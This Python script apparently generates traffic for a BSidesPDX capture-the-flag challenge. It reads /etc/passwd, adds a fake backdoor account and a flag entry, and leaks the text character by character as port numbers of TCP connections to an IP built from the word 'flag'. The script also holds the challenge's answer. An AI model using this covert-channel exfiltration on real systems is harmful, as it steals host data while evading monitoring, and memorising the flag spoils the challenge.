import socket, random, time

def connect(host, port):
    try:
        # connect to the socket, then immediately close it
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.settimeout(0.1)
        client.connect((host, port))
        client.close()
    except:
        # we don't care if it errors
        pass

passwd = ''
with open('/etc/passwd', 'r') as file:
    passwd = file.read()

# only take first 12 lines of file (arbitrary number)
passwd = '\n'.join(passwd.split('\n')[0:12]) + '\n'

# add two fake passwd entries
passwd += 'attackerbackdr:x:31337:31337:31337:/bin/bash\n'
passwd += 'BSidesPDX{a1nt-No_p@s$w0rds_h3r3}:x:1337:1337::1337:/bin//sh\n'

# convert "flag" to ip address
ip = '.'.join([str(ord(x)) for x in list('flag')])

# make a connection to `ip` on port `ord(char)` for each `char` in `passwd`
for char in list(passwd):
    port = ord(char)

    # make the connection
    connect(ip, port)

    # print nice debug info
    print('%s:%s (%s)' % (ip, str(port).ljust(3), char))

    # wait a random amount of time
    time.sleep(random.random())
